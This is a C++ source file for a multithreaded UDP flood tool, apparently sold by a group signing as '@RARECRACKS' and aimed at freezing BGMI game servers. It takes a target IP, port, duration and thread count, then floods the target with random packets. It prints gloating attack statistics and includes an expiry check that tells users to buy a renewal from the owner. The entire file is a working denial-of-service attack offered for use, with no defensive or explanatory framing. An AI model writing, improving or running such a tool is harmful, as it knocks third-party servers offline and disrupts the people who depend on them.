#include <iostream>
#include <cstdlib>
#include <cstring>
#include <arpa/inet.h>
#include <pthread.h>
#include <ctime>
#include <csignal>
#include <vector>
#include <memory>
#include <unistd.h>
#include <sys/stat.h>
#include <ctime>

#ifdef _WIN32
    #include <windows.h>
    void usleep(int duration) { Sleep(duration / 1000); }
#else
    #include <unistd.h>
#endif

#define PAYLOAD_SIZE 20
#define EXPIRY_DATE "2026-1-12"
#define OWNER_USERNAME "@RARExxOWNER"
#define ATTACK_USERNAME "@RARECRACKS"

class Attack {
public:
    Attack(const std::string& ip, int port, int duration)
        : ip(ip), port(port), duration(duration), packets_sent(0), packets_successful(0), packets_failed(0), data_delivered(0) {}

    void generate_payload(char *buffer, size_t size) {
        for (size_t i = 0; i < size; i++) {
            buffer[i * 4] = '\\';
            buffer[i * 4 + 1] = 'x';
            buffer[i * 4 + 2] = "0123456789abcdef"[rand() % 16];
            buffer[i * 4 + 3] = "0123456789abcdef"[rand() % 16];
        }
        buffer[size * 4] = '\0';
    }

    void attack_thread() {
        int sock;
        struct sockaddr_in server_addr;
        time_t endtime;

        char payload[PAYLOAD_SIZE * 4 + 1];
        generate_payload(payload, PAYLOAD_SIZE);

        if ((sock = socket(AF_INET, SOCK_DGRAM, 0)) < 0) {
            perror("Socket creation failed");
            pthread_exit(NULL);
        }

        memset(&server_addr, 0, sizeof(server_addr));
        server_addr.sin_family = AF_INET;
        server_addr.sin_port = htons(port);
        server_addr.sin_addr.s_addr = inet_addr(ip.c_str());

        endtime = time(NULL) + duration;

        while (time(NULL) <= endtime) {
            ssize_t payload_size = strlen(payload);
            if (sendto(sock, payload, payload_size, 0, (const struct sockaddr *)&server_addr, sizeof(server_addr)) < 0) {
                perror("Send failed");
                packets_failed++;
            } else {
                packets_sent++;
                data_delivered += payload_size;
            }
            usleep(100); // Throttle packet sending slightly to avoid overwhelming the system.
        }

        close(sock);
    }

    void print_attack_status(time_t endtime) {
        time_t remaining_time = endtime - time(NULL);
        if (remaining_time > 0) {
            std::cout << "⏳ Remaining Time For The Attack: " << remaining_time << " Seconds\r";
            std::cout.flush();
        }
    }

    void show_attack_result() {
        double data_gb = data_delivered / 1024.0 / 1024.0 / 1024.0;
        std::cout << "━─━────༺༻────━─━━─━────༺༻────━─━━─━────༺༻────━─━\n";
        std::cout << "\n🎉✨ Sᴄʀɪᴘᴛ Cᴏᴅᴇᴅ Bʏ @RARECRACKS ✨🎉\n";
        std::cout << "👨‍💻 Oᴡɴᴇʀ = @RARExxOWNER 👨‍💻\n";
        std::cout << "🌟✨ Aᴛᴛᴀᴄᴋ Fɪɴɪsʜᴇᴅ ✨🌟\n";
        std::cout << "✅ Pᴀᴄᴋᴇᴛs Sᴇɴᴛ: " << packets_sent << "\n";
        std::cout << "✅ Pᴀᴄᴋᴇᴛs Sᴜᴄᴄᴇssғᴜʟ: " << packets_successful << "\n";
        std::cout << "❌ Pᴀᴄᴋᴇᴛs Fᴀɪʟᴇᴅ: " << packets_failed << "\n";
        std::cout << "📦 Dᴀᴛᴀ Dᴇʟɪᴠᴇʀᴇᴅ: " << data_delivered / 1024.0 / 1024.0 << " MB\n";
        std::cout << "📦 Dᴀᴛᴀ Dᴇʟɪᴠᴇʀᴇᴅ (ɪɴ GB): " << data_gb << " GB\n";
        std::cout << "━─━────༺༻────━─━━─━────༺༻────━─━━─━────༺༻────━─━\n";

        std::cout << "\n💥 Aᴛᴛᴀᴄᴋ Sᴜᴄᴄᴇssғᴜʟ! 💥\n";
    }

private:
    std::string ip;
    int port;
    int duration;
    int packets_sent;
    int packets_successful;
    int packets_failed;
    size_t data_delivered;
};

void handle_sigint(int sig) {
    std::cout << "\n⚠️ Sᴛᴏᴘᴘɪɴɢ Aᴛᴛᴀᴄᴋ... ⚠️\n";
    exit(0);
}

void check_expiry() {
    struct tm expiry_tm = {};
    strptime(EXPIRY_DATE, "%Y-%m-%d", &expiry_tm);
    time_t expiry_time = mktime(&expiry_tm);
    time_t current_time = time(NULL);

    if (current_time > expiry_time) {
        std::cout << "❌ Lᴏᴅᴇ Yᴇ Fɪʟᴇ EXPɪʀᴇ Hᴀɪ Oᴡɴᴇʀ = @RARExxOWNER Sᴇ Kʜᴀʀɪᴅ\n";
        std::cout << "💬 Aᴜʀ Bᴜʟɴᴀ Mᴀᴛ " << ATTACK_USERNAME << " Kᴏ Jᴏɪɴ Kᴀʀɴᴀ\n";
        exit(1);
    }
}



void usage() {
    std::cout << "⚠️ Uѕᴀɢᴇ: ./rare ɪᴘ ᴘᴏʀᴛ ᴅᴜʀᴀᴛɪᴏɴ ᴛʜʀᴇᴀᴅs ⚠️\n";
    exit(1);
}

int main(int argc, char *argv[]) {
    if (argc != 5) {
        usage();
    }

    check_expiry();

    std::string ip = argv[1];
    int port = std::atoi(argv[2]);
    int duration = std::atoi(argv[3]);
    int threads = std::atoi(argv[4]);

    std::signal(SIGINT, handle_sigint);

    std::vector<pthread_t> thread_ids(threads);
    std::vector<std::unique_ptr<Attack>> attacks;

    std::cout << "\n🌊✨ Aᴛᴛᴀᴄᴋ Bʏ @RARECRACKS Hᴀs Sᴛᴀʀᴛᴇᴅ 🌊✨\n";
    printf("────── ⋆⋅☆⋅⋆ ──────────── ⋆⋅☆⋅⋆ ──────────── ⋆⋅☆⋅⋆ ──────\n");
    printf("⚡ Yᴏᴜʀ Aᴛᴛᴀᴄᴋ Hᴀs Sᴛᴀʀᴛᴇᴅ ⚡\n");
    printf("🔥 Pᴀʏʟᴏᴀᴅ Sᴇɴᴅɪɴɢ Rᴇᴘᴇᴀᴛᴇᴅʟʏ Oɴ Tᴀʀɢᴇᴛ 🔥\n");
    printf("🎯 Tᴀʀɢᴇᴛ ɪᴘ: %s\n", ip.c_str());
    printf("📍 Tᴀʀɢᴇᴛ Pᴏʀᴛ: %d\n", port);
    printf("⏳ Dᴜʀᴀᴛɪᴏɴ: %d Sᴇᴄᴏɴᴅs\n", duration);
    printf("🧵 Tʜʀᴇᴀᴅs: %d\n", threads);
    printf("⚔️ Mᴇᴛʜᴏᴅ: Bɢᴍɪ Sᴇʀᴠᴇʀ Fʀᴇᴇᴢᴇ Bʏ Rꫝʀᴇ Dᴅᴏs  ⚔️\n");
    printf("────── ⋆⋅☆⋅⋆ ──────────── ⋆⋅☆⋅⋆ ──────────── ⋆⋅☆⋅⋆ ──────\n");

    time_t endtime = time(NULL) + duration;

    for (int i = 0; i < threads; i++) {
        attacks.push_back(std::make_unique<Attack>(ip, port, duration));

        if (pthread_create(&thread_ids[i], NULL, [](void* arg) -> void* {
            Attack* attack = static_cast<Attack*>(arg);
            attack->attack_thread();
            return nullptr;
        }, attacks[i].get()) != 0) {
            perror("Thread creation failed");
            exit(1);
        }
        std::cout << "🧨 Lᴀᴜɴᴄʜᴇᴅ Tʜʀᴇᴀᴅ Wɪᴛʜ ID: " << thread_ids[i] << "\n";
    }

    while (time(NULL) <= endtime) {
        for (auto& attack : attacks) {
            attack->print_attack_status(endtime);
        }
        usleep(1000); // Update status every second
    }

    for (int i = 0; i < threads; i++) {
        pthread_join(thread_ids[i], NULL);
    }

    // Call show_attack_result() after all threads finish
    for (auto& attack : attacks) {
        attack->show_attack_result();
    }

    return 0;
}
